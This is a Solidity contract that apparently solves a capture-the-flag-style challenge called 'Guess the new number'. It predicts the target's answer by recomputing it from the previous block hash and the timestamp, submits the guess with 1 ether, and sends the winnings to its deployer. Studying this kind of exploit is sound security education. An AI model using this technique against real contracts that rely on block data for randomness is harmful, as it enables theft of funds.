pragma solidity ^0.8.0;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttack {
    address private constant challengeAddress =
        0x08962e45b45153c3365592040E50aCa99370d62c;

    constructor() payable {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        GuessTheNewNumberChallenge(challengeAddress).guess{value: 1 ether}(
            answer
        );

        uint256 amount = address(this).balance;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed to send Ether");
    }
}
